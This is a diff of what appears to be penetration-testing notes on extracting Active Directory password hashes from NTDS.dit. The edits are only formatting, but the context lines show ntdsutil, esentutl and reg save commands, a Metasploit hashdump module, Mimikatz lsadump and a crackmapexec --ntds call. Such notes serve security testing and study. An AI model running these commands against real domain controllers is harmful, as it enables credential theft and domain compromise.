@@ -49,7 +49,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
 ```
 
-&#x20;or run ntdsutil interactivly:
+or run ntdsutil interactivly:
 
 ```
 C:\>ntdsutil
@@ -112,7 +112,7 @@ reg.exe save hklm\system c:\exfil\system.bak
 esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 ```
 
-****
+***
 
 ## Extracting hashes from NTDS.dit
 
@@ -142,7 +142,6 @@ Finally, you can also use the metasploit module:
 ```
 post/windows/gather/credentials/domain_hashdump
 lsadump::lsa /inject
-
 ```
 
 ### PowerSploit module
@@ -161,7 +160,9 @@ cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ### Mimikatz
 
 {% hint style="info" %}
-Dumps credential data in an Active Directory domain when run on a Domain Controller.![warning](https://github.githubassets.com/images/icons/emoji/unicode/26a0.png) Requires administrator access with debug or Local SYSTEM rights
+Dumps credential data in an Active Directory domain when run on a Domain Controller.
+
+This requires administrator access with debug or Local SYSTEM rights.
 {% endhint %}
 
 ```
